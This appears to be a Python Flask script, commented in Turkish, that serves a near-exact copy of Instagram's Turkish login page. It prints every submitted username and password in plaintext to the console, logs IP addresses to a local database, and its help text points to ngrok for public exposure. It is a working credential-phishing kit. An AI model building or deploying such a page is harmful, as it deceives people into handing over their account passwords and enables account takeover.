                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               
import os
import sqlite3
import sys
from datetime import datetime
from flask import Flask, request, render_template_string, redirect, url_for
import typer
from rich.console import Console
from rich.table import Table

web_app = Flask(__name__)
cli_app = typer.Typer(help="Sunucu yönetimi - FLASK-NGROK")
console = Console()
DB_NAME = "system_server.db"

def init_db():
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()

    cursor.execute("""
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT UNIQUE,
            password TEXT
        )
    """)

    cursor.execute("""
        CREATE TABLE IF NOT EXISTS access_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username_tried TEXT,
            ip_address TEXT,
            status TEXT,
            timestamp TEXT
        )
    """)

    try:
        cursor.execute("INSERT INTO users (username, password) VALUES (?, ?)", ("admin", "admin123"))
        conn.commit()
    except sqlite3.IntegrityError:
        pass

    conn.close()

LOGIN_HTML = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #fafafa;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .main {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 32px;
            max-width: 935px;
            width: 100%;
        }

        /* Sol taraf - Telefon mockup */
        .phones {
            display: none;
            position: relative;
            width: 380px;
            height: 580px;
        }

        @media (min-width: 876px) {
            .phones {
                display: block;
            }
        }

        .phone-bg {
            position: absolute;
            width: 250px;
            height: 538px;
            background: #000;
            border-radius: 40px;
            border: 8px solid #222;
            right: 0;
            top: 20px;
            overflow: hidden;
            box-shadow: 0 0 20px rgba(0,0,0,0.15);
        }

        .phone-screen {
            width: 100%;
            height: 100%;
            background: linear-gradient(45deg, #833ab4, #fd1d1d, #fcb045);
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 22px;
            font-weight: 600;
            text-align: center;
            padding: 20px;
        }

        .phone-screen span {
            background: rgba(0,0,0,0.3);
            padding: 8px 16px;
            border-radius: 20px;
        }

        /* Sağ taraf - Login formu */
        .form-side {
            width: 100%;
            max-width: 350px;
        }

        .login-box {
            background: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 40px 40px 25px;
            margin-bottom: 10px;
            text-align: center;
        }

        /* Instagram Logo - Düzgün yazı */
        .instagram-logo {
            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
            font-size: 42px;
            font-weight: 500;
            color: #262626;
            margin: 0 auto 28px;
            letter-spacing: -1.5px;
            line-height: 1;
        }

        form {
            display: flex;
            flex-direction: column;
            gap: 6px;
        }

        input {
            width: 100%;
            height: 38px;
            padding: 9px 8px 7px;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            font-size: 12px;
            color: #262626;
            outline: none;
        }

        input:focus {
            border-color: #a8a8a8;
        }

        input::placeholder {
            color: #8e8e8e;
            font-size: 12px;
        }

        .login-btn {
            margin-top: 14px;
            width: 100%;
            height: 32px;
            background: #0095f6;
            border: none;
            border-radius: 8px;
            color: #fff;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
        }

        .login-btn:hover {
            background: #1877f2;
        }

        .divider {
            display: flex;
            align-items: center;
            margin: 18px 0 22px;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
        }

        .divider::before,
        .divider::after {
            content: "";
            flex: 1;
            height: 1px;
            background: #dbdbdb;
        }

        .divider span {
            padding: 0 18px;
        }

        .fb-login {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            color: #385185;
            font-weight: 600;
            font-size: 14px;
            text-decoration: none;
            margin-bottom: 20px;
        }

        .fb-login:hover {
            color: #00376b;
        }

        .forgot {
            color: #00376b;
            font-size: 12px;
            text-decoration: none;
        }

        .msg {
            margin-top: 16px;
            padding: 12px;
            background: #fef2f2;
            border: 1px solid #fecaca;
            border-radius: 4px;
            color: #ed4956;
            font-size: 14px;
            text-align: center;
            line-height: 1.4;
        }

        .msg.success {
            background: #f0fdf4;
            border-color: #bbf7d0;
            color: #16a34a;
        }

        .signup-box {
            background: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 22px;
            text-align: center;
            font-size: 14px;
            color: #262626;
            margin-bottom: 20px;
        }

        .signup-box a {
            color: #0095f6;
            font-weight: 600;
            text-decoration: none;
        }

        .get-app {
            text-align: center;
            font-size: 14px;
            color: #262626;
            margin-bottom: 20px;
        }

        .app-buttons {
            display: flex;
            justify-content: center;
            gap: 8px;
            margin-top: 16px;
        }

        .app-btn {
            background: #000;
            color: #fff;
            padding: 8px 14px;
            border-radius: 5px;
            font-size: 11px;
            text-decoration: none;
            display: flex;
            align-items: center;
            gap: 6px;
        }

        .footer {
            margin-top: 40px;
            text-align: center;
            color: #8e8e8e;
            font-size: 12px;
            line-height: 1.8;
        }

        .footer a {
            color: #8e8e8e;
            text-decoration: none;
            margin: 0 8px;
        }

        .footer a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="main">
        <!-- Sol taraf telefon -->
        <div class="phones">
            <div class="phone-bg">
                <div class="phone-screen">
                    <span>Instagram</span>
                </div>
            </div>
        </div>

        <!-- Sağ taraf form -->
        <div class="form-side">
            <div class="login-box">
                <!-- Instagram Logo (düzgün yazı) -->
                <div class="instagram-logo">Instagram</div>

                <form method="POST" action="/login">
                    <input type="text" name="username" placeholder="Telefon numarası, kullanıcı adı veya e-posta" required autocomplete="username">
                    <input type="password" name="password" placeholder="Şifre" required autocomplete="current-password">
                    <button type="submit" class="login-btn">Giriş yap</button>
                </form>

                <div class="divider">
                    <span>VEYA</span>
                </div>

                <a href="#" class="fb-login">
                    <svg width="16" height="16" viewBox="0 0 16 16" fill="#385185">
                        <path d="M16 8.05C16 3.6 12.4 0 8 0S0 3.6 0 8.05c0 4 2.9 7.3 6.8 7.9v-5.6H4.7V8.05h2.1V6.3c0-2.1 1.2-3.2 3.1-3.2.9 0 1.8.2 1.8.2v2h-1c-1 0-1.3.6-1.3 1.2v1.5h2.3l-.4 2.3h-1.9V16c3.9-.6 6.8-3.9 6.8-7.95z"/>
                    </svg>
                    Facebook ile Giriş Yap
                </a>

                <a href="#" class="forgot">Şifreni mi unuttun?</a>

                {% if msg %}
                    <div class="msg {% if 'Başarılı' in msg %}success{% endif %}">{{ msg }}</div>
                {% endif %}
            </div>

            <div class="signup-box">
                Hesabın yok mu? <a href="#">Kaydol</a>
            </div>

            <div class="get-app">
                Uygulamayı indir.
                <div class="app-buttons">
                    <a href="#" class="app-btn">App Store</a>
                    <a href="#" class="app-btn">Google Play</a>
                </div>
            </div>
        </div>
    </div>

    <div class="footer">
        <div>
            <a href="#">Meta</a>
            <a href="#">Hakkında</a>
            <a href="#">Blog</a>
            <a href="#">İş Fırsatları</a>
            <a href="#">Yardım</a>
            <a href="#">API</a>
            <a href="#">Gizlilik</a>
            <a href="#">Koşullar</a>
            <a href="#">Konumlar</a>
            <a href="#">Instagram Lite</a>
            <a href="#">Threads</a>
            <a href="#">Kişi Yükleme ve Hesap Olmayan Kişiler</a>
            <a href="#">Meta Verified</a>
        </div>
        <div style="margin-top: 16px;">
            Türkçe · © 2026 Instagram from Meta
        </div>
    </div>
</body>
</html>
"""

@web_app.route('/')
def home():
    return render_template_string(LOGIN_HTML)

@web_app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    ip_addr = request.remote_addr
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    console.print(f"\n[bold yellow] YENİ GİRİŞ DENEMESİ[/bold yellow]")
    console.print(f"[cyan]Kullanıcı Adı:[/cyan] [bold white]{username}[/bold white]")
    console.print(f"[cyan]Şifre:[/cyan]        [bold white]{password}[/bold white]")
    console.print(f"[cyan]IP:[/cyan]           {ip_addr}")
    console.print(f"[cyan]Zaman:[/cyan]        {now}")
    console.print("-" * 50)

    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()

    cursor.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password))
    user = cursor.fetchone()

    if user:
        status = "BAŞARILI"
        msg = "Giriş Başarılı!"
        console.print(f"[bold green] BAŞARILI GİRİŞ → {username}[/bold green]\n")
    else:
        status = "BAŞARISIZ"
        msg = "Şifren yanlış, lütfen tekrar dene."
        console.print(f"[bold red]✗ BAŞARISIZ DENEME → {username}[/bold red]\n")

    cursor.execute(
        "INSERT INTO access_logs (username_tried, ip_address, status, timestamp) VALUES (?, ?, ?, ?)",
        (username, ip_addr, status, now)
    )
    conn.commit()
    conn.close()

    return render_template_string(LOGIN_HTML, msg=msg)

@cli_app.command()
def start(port: int = 5000):
    """5000 portunda web sunucusu aktif"""
    init_db()
    console.print(f"[bold green] Sunucu aktif [/bold green]")
    console.print(f"[bold cyan]Arayüze erişmek için:[/bold cyan] http://localhost:{port}")
    console.print("[yellow]Sunucuyu kapatmak için CTRL+C yapabilirsiniz.[/yellow]\n")

    web_app.run(host='0.0.0.0', port=port, debug=False)

@cli_app.command()
def logs():
    """LOG"""
    init_db()
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute("SELECT id, username_tried, ip_address, status, timestamp FROM access_logs ORDER BY id DESC")
    logs = cursor.fetchall()
    conn.close()

    table = Table(title="Veri Tabanı - Sunucu Giriş Logları")
    table.add_column("ID", style="dim", justify="center")
    table.add_column("Denenen Kullanıcı", style="bold white")
    table.add_column("IP Adresi", style="cyan")
    table.add_column("Durum", justify="center")
    table.add_column("Tarih / Saat", style="magenta")

    for log in logs:
        status_color = "[green]BAŞARILI[/green]" if log[3] == "BAŞARILI" else "[red]BAŞARISIZ[/red]"
        table.add_row(str(log[0]), log[1], log[2], status_color, log[4])

    console.print(table)

if __name__ == "__main__":
    cli_app()










